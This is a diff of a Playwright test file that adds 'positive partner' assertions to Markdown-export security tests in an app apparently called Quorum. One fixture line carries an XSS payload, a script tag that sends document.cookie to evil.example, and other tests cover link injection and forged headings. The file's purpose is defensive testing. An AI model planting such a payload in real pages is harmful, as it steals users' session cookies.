@@ -157,6 +157,9 @@ test.describe("F-12 — export completeness and section expanders", () => {
     ];
     await driveToResult(page, resp);
     const md = await exportedMarkdown(page);
+    // POSITIVE PARTNER (#131): prove the source actually reached the export, so
+    // "no javascript: link" is not trivially true over an export with no sources.
+    expect(md).toContain("https://example.com/benign");
     expect(
       md,
       "the title's ] and ( closed the link early and opened a hostile one " +
@@ -184,6 +187,9 @@ test.describe("F-12 — export completeness and section expanders", () => {
           "reader sees '4 of 4 live' first on a run where nothing was live"
       ).toBeLessThan(forged);
     }
+    // POSITIVE PARTNER (#131): the export's OWN provenance heading must exist —
+    // otherwise "there are not two of them" passes over an export with none.
+    expect(md).toContain("## About this run");
     // And it must not have impersonated a STRUCTURAL heading.
     expect(
       md,
@@ -198,6 +204,9 @@ test.describe("F-12 — export completeness and section expanders", () => {
       'Fine.<script>fetch("https://evil.example/"+document.cookie)</script>';
     await driveToResult(page, resp);
     const md = await exportedMarkdown(page);
+    // POSITIVE PARTNER (#131): the surrounding provider text must have reached
+    // the export, or "no <script>" is true merely because the section is absent.
+    expect(md).toContain("Fine.");
     expect(
       md,
       "a <script> tag from provider text survived verbatim; any viewer that " +
@@ -249,11 +258,13 @@ test.describe("F-12 — export completeness and section expanders", () => {
     expect(onScreen).toMatch(/Incomplete result — not every model answered/);
 
     const md = await exportedMarkdown(page);
+    // POSITIVE PARTNER (#131): `toContain` on the literal, not `toMatch` — the
+    // guard counts the former as proof the subject holds something.
     expect(
       md,
       "the exported file must carry the same disclosure the screen showed"
-    ).toMatch(/Incomplete result — not every model answered/);
-    expect(md).toMatch(/3 of 4 models answered/);
+    ).toContain("Incomplete result — not every model answered");
+    expect(md).toContain("3 of 4 models answered");
     expect(
       md,
       "nothing was simulated on this run, so the file must not say it was"
@@ -282,12 +293,16 @@ test.describe("F-12 — export completeness and section expanders", () => {
     await driveToResult(page, resp);
     const md = await exportedMarkdown(page);
     // The view refuses to make these anchors and badges them as simulated.
+    // POSITIVE PARTNER (#131) is the "not a real source" assertion below, not the
+    // URL: MEASURED, the export does NOT carry the stub URL as text at all, so an
+    // assertion on it fails. What proves the source was DISCLOSED rather than
+    // silently dropped is the badge — so "never linked" is not vacuous.
     expect(
       md,
       "a Quorum-side placeholder pointing at the reserved example.test domain " +
         "was laundered into a numbered citation"
     ).not.toContain("](https://example.test/local-demo/1)");
-    expect(md).toMatch(/not a real source/);
+    expect(md).toContain("not a real source");
   });
 
   // Untrusted model text must not be able to forge the export's STRUCTURE.
